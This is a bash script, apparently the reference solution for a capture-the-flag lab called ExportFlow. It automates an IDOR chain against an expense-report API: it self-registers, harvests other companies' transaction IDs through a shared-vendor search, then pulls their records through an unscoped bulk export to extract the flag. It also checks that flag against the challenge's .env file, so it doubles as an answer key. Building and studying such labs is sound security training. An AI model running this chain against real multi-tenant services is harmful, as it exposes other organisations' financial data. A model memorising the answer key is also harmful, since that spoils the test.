#!/usr/bin/env bash
# ============================================================
# ExportFlow (labs21) — reference solution: cross-company ID
# harvest -> export IDOR
#
# Chain: self-register into Company A -> the shared-vendor search
# (find_paginated) returns transaction IDs from EVERY company that
# uses the vendor — IDs only, no data -> the bulk export accepts
# any known ID in includedObjects without scope validation -> the
# CSV includes the foreign company's receipt memo, which holds the
# flag.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8101)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8101}"
FLAG_RE='FLAG{nusasec-[0-9a-f]{32}}'
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
email="test-$(date +%s)-$RANDOM@arena.local"

echo "[*] self-registering into Company A" >&2
TOKEN="$(curl -fsS -X POST "$BASE/auth/register" -H 'Content-Type: application/json' \
  -d "{\"email\":\"$email\",\"password\":\"test123\"}" \
  | python3 -c 'import sys,json; print(json.load(sys.stdin).get("token",""))')"
[[ -n "$TOKEN" ]] || { echo "[-] failed: registration returned no token" >&2; exit 1; }

echo "[*] harvesting transaction IDs from the shared-vendor search (IDs leak across companies)" >&2
BODY='{"paginationParams":{"searchQuery":"lyft"}}'
RESP="$(curl -fsS -X POST "$BASE/api/expense_report_transactions/find_paginated" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d "$BODY")"
IDS="$(python3 - "$RESP" <<'PY'
import json, sys
items = json.loads(sys.argv[1])["items"]
print(json.dumps([i["id"] for i in items]))
PY
)"
echo "[*] harvested $(python3 -c 'import sys,json; print(len(json.load(sys.stdin)))' <<<"$IDS") transaction IDs" >&2

echo "[*] exporting the harvested IDs via perform_bulk_action (no scope check)" >&2
EXPORT="$(curl -fsS -X POST "$BASE/api/expense_report_transactions/perform_bulk_action" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d "{\"includedObjects\":$IDS,\"actionType\":\"BULK_EXPORTING\"}")"
URL="$(python3 -c 'import sys,json; print(json.load(sys.stdin)["downloadUrl"])' <<<"$EXPORT")"

CSV="$(curl -fsS "$BASE$URL" -H "Authorization: Bearer $TOKEN")"
flag="$(grep -Eo "$FLAG_RE" <<<"$CSV" | head -n1 || true)"

if [[ -z "${flag:-}" ]]; then
  echo "[-] failed: no flag in exported CSV" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
